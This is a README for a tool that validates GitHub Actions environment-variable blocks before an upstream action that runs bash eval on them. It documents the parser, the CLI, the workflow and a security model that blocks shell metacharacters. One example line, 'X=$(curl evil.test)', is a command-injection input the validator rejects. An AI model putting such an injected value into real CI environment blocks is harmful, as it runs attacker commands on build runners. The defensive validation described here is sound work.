# Easy Env Vars

SaaS UI + safe parser for sequential GitHub Actions environment blocks, integrated with [`briantist/ezenv@v1.0.0`](https://github.com/briantist/ezenv).

## Live Deployment

▶️ **[Open the live app & test it](https://revvel-standards.vercel.app/docs/easy-env-vars/)**

> If that path is not yet promoted on the monorepo Vercel project, run the product locally (port **3012**) or deploy this folder with `vercel products/easy-env-vars`.

## What It Is

GitHub Actions can write persistent job env vars via `GITHUB_ENV`, but composing multi-line blocks that reference earlier variables is error-prone and — when driven by bash `eval` — can open command-injection holes.

This product ships:

1. **Safe parser** (`lib/parse-env.js`) — ordered `NAME=value` parsing, `${VAR:-default}` expansion, circular-reference detection, malformed-name rejection, and shell-metacharacter blocking.
2. **CI CLI** (`lib/validate-cli.js`) — used by `.github/workflows/easy-env-vars.yml` as a pre-gate before the upstream action runs.
3. **Web UI** — compose blocks, inspect findings, copy a workflow snippet pinned to the full `briantist/ezenv` commit SHA.
4. **Production workflow** — `workflow_dispatch` / `workflow_call` integration of `briantist/ezenv@f38d123244576d2065059c68a02ab332fc682199` (tag `v1.0.0`).

## Why `briantist/ezenv`

| Field | Value |
| --- | --- |
| Action | `briantist/ezenv` |
| Version | `v1.0.0` |
| Commit SHA | `f38d123244576d2065059c68a02ab332fc682199` |
| License | MIT |
| Stars | 1 (single-author; accepted under WR #15863 with SHA pin + pre-validation) |
| Monetization path | SaaS UI for CI teams generating safe env blocks; freemium export, paid org templates |

Keywords: `GITHUB_ENV`, `GitHub Actions environment variables`, `shell parameter expansion`, `CI secrets hygiene`, `ezenv`.

## Local Development

```bash
cd products/easy-env-vars
npm install
npm test
npm run lint
npm run dev    # http://localhost:3012
```

## Validation / CLI

From the repo root:

```bash
# Unit tests (root suite includes tests/easy-env-vars.test.js)
npm test -- tests/easy-env-vars.test.js

# Validate a block
printf 'A=1\nB=$A\n' | node products/easy-env-vars/lib/validate-cli.js --stdin

# Reject injection
printf 'X=$(curl evil.test)\n' | node products/easy-env-vars/lib/validate-cli.js --stdin; echo exit:$?
```

## Workflow usage

```yaml
jobs:
  demo:
    uses: ./.github/workflows/easy-env-vars.yml
    with:
      env_block: |
        SOME_FLAG=1
        THIS_GREETING=hello
        THAT_VALUE=${THIS_GREETING:-hi} ${LOCATION:-world}
```

Or dispatch **Easy Env Vars** from the Actions tab and paste a multi-line block.

## Security model

Upstream `ezenv.sh` evaluates each line with bash `eval`. This product never skips the pre-validation gate:

- Invalid names → error
- `;`, `|`, `&&`, backticks, non-allowlisted `$(…)` → error
- Cycles (`A=$B`, `B=$A`) → error (no expansion attempted)
- Allowlisted only: `$(pwd)`, `$(echo …)`
- Earlier assignment failures do not drop later safe assignments (`continueOnError`)

## Deploy path

- **Vercel:** `products/easy-env-vars` (`vercel.json` included)
- **GitHub Actions:** `.github/workflows/easy-env-vars.yml` (already in-repo)
- **Audit allowlist:** `briantist/ezenv` in `scripts/audit-third-party-actions.sh` (`ACCEPTED_SINGLE_AUTHOR_ACTIONS`)

## Definition of Done (WR #15863)

- [x] `briantist/ezenv@v1.0.0` pinned by full SHA in production workflow
- [x] Pre-validation for malformed defs, circular refs, injection
- [x] Sequential processing with continue-on-earlier-failure
- [x] Shippable app with docs + tests + deploy path
- [x] Regression tests in root `tests/easy-env-vars.test.js`
